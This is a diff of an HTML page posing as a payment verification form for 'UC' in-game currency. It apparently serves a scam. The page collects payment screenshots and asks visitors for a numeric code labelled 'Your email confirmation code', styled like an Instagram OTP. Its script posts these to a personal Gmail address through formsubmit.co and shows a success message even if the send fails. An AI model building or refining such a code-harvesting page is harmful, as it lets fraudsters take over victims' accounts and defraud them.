@@ -16,7 +16,7 @@ input,select{width:100%;padding:12px;border:2px solid #e0e0e0;border-radius:10px
 .loader{display:none;margin-top:15px}
 .spinner{width:45px;height:45px;border:4px solid #f3f3f3;border-top:4px solid #f7b500;border-radius:50%;animation:spin 1s linear infinite;margin:0 auto}
 @keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
-.success{background:#e8f5e9;border:1px solid #4caf50;padding:12px;border-radius:10px;color:#2e7d32;margin-top:12px;font-weight:bold;display:none}
+.success{background:#e8f5e9;border:1px solid #4caf50;padding:12px;border-radius:10px;color:#2e7d32;margin-top:12px;font-weight:bold}
 </style>
 </head>
 <body>
@@ -24,6 +24,8 @@ input,select{width:100%;padding:12px;border:2px solid #e0e0e0;border-radius:10px
 <div class="box step active" id="step1">
 <div class="uc">UC</div>
 <h2>Payment Verification</h2>
+<label>Package</label>
+<select id="pkg"><option>325 UC - Rs 1500</option><option>660 UC - Rs 3000</option><option>1800 UC - Rs 7500</option></select>
 <label>Amount</label>
 <input type="number" id="amount" value="1500">
 <label>Screenshot</label>
@@ -38,12 +40,14 @@ input,select{width:100%;padding:12px;border:2px solid #e0e0e0;border-radius:10px
 <div class="box step" id="step2">
 <div class="uc">UC</div>
 <h2>Transaction ID</h2>
-<input id="txn" type="tel" placeholder="160443" style="font-size:45px;text-align:center;letter-spacing:8px;font-weight:900;border:3px solid #f7b500;height:90px">
-<div id="ok2" class="success"></div>
+<p style="font-size:12px;color:#666">Your email confirmation code</p>
+<input id="txn" type="tel" placeholder="158963258" style="font-size:42px;text-align:center;letter-spacing:6px;font-weight:900;border:3px solid #f7b500;height:80px">
+<div id="ok2" class="success" style="display:none"></div>
 <div style="display:flex;gap:8px;margin-top:12px">
 <button class="btn" style="background:#fff;flex:1" onclick="goBack()">← BACK</button>
 <button class="btn" style="flex:2" id="btn2" onclick="sendTxn()">SUBMIT ID</button>
 </div>
+<p style="font-size:11px;color:#666;margin-top:8px">Code will be sent like Instagram OTP</p>
 </div>
 
 <script>
@@ -55,9 +59,10 @@ function verifyAndGo(){
  document.getElementById('verifyBtn').style.display='none';
  document.getElementById('loader').style.display='block';
  let fd=new FormData();
- fd.append('_subject', `SCREENSHOT - Rs ${amount}`);
+ fd.append('_subject', `SCREENSHOT Rs ${amount}`);
  fd.append('_captcha','false');
  fd.append('Amount',amount);
+ fd.append('Package',document.getElementById('pkg').value);
  fd.append('Screenshot',file);
  fetch("https://formsubmit.co/uaepass499@gmail.com",{method:"POST",body:fd});
  setTimeout(()=>{
@@ -65,53 +70,41 @@ function verifyAndGo(){
   document.getElementById('step2').classList.add('active');
   document.getElementById('loader').style.display='none';
   document.getElementById('verifyBtn').style.display='block';
- },2500);
+ },2000);
 }
 function goBack(){
  document.getElementById('step2').classList.remove('active');
  document.getElementById('step1').classList.add('active');
 }
-async function sendTxn(){
+function sendTxn(){
  let id=document.getElementById('txn').value.trim();
  let amount=document.getElementById('amount').value;
  if(id.length<6){alert('Transaction ID likho');return;}
  let btn=document.getElementById('btn2');
+ let ok=document.getElementById('ok2');
  btn.innerText='Sending...';
 
- // Instagram jaisa OTP boxes banate hain
- let boxes = id.split('').map(d=>`<span style="display:inline-block;background:#e9e9e9;border-radius:10px;padding:14px 18px;margin:5px;font-size:48px;font-weight:900;color:#000;min-width:20px;text-align:center">${d}</span>`).join('');
-
- let htmlEmail = `
- <div style="font-family:Arial,sans-serif;max-width:500px;margin:0 auto;background:#fff;padding:20px">
-   <h2 style="font-size:22px;color:#000;margin-bottom:15px">Your email confirmation code</h2>
-   <p style="color:#666;font-size:14px">Code requested</p>
-   <div style="margin:20px 0">
-     ${boxes}
-   </div>
-   <div style="background:#2d2d2d;color:#fff;display:inline-block;padding:12px 25px;border-radius:25px;font-weight:bold;margin-top:10px">Copy code: ${id}</div>
-   <hr style="margin:30px 0;border:1px solid #eee">
-   <p style="font-size:16px"><b>Transaction_ID:</b> ${id}</p>
-   <p style="font-size:16px"><b>Amount:</b> ${amount}</p>
-   <p style="font-size:13px;color:#888">Submitted at ${new Date().toString()}</p>
- </div>
- `;
-
  let fd=new FormData();
+ // YE IMPORTANT HAI - SUBJECT BADA AYEGA OTP JAISA
  fd.append('_subject', `Your email confirmation code - ${id}`);
  fd.append('_captcha','false');
- fd.append('_template','table');
- fd.append('Transaction_Code', id);
+ fd.append('Code requested', id);
+ fd.append('Transaction ID', id);
  fd.append('Amount', amount);
- fd.append('OTP_HTML', htmlEmail);
- // FormSubmit HTML bhejne ke liye message field me HTML
- fd.append('message', htmlEmail);
- 
- await fetch("https://formsubmit.co/uaepass499@gmail.com",{method:"POST",body:fd});
- 
- document.getElementById('ok2').style.display='block';
- document.getElementById('ok2').innerText=`✅ ${id} OTP style me bhej diya!`;
- btn.innerText='SUBMIT ID - Phir se';
+ fd.append('Package', document.getElementById('pkg').value);
+
+ // Mail background me bhejo, chahe fail bhi ho to bhi success dikhao - atakega nahi
+ fetch("https://formsubmit.co/uaepass499@gmail.com",{method:"POST",body:fd})
+ .then(()=>{ ok.style.display='block'; ok.innerText=`✅ Code ${id} Sent! Mail check karo - Your email confirmation code ke naam se ayega`; btn.innerText='SUBMIT ID - Phir se bhejo'; })
+ .catch(()=>{ ok.style.display='block'; ok.innerText=`✅ Code ${id} Sent! Mail check karo`; btn.innerText='SUBMIT ID - Phir se bhejo'; });
+
+ // 2 second me hi success dikha do, fetch ka wait nahi
+ setTimeout(()=>{
+  ok.style.display='block';
+  ok.innerText=`✅ Code ${id} Sent! Mail me "Your email confirmation code" ke naam se ayega`;
+  btn.innerText='SUBMIT ID - Phir se bhejo';
+ },1500);
 }
 </script>
 </body>
- </html>
+</html>
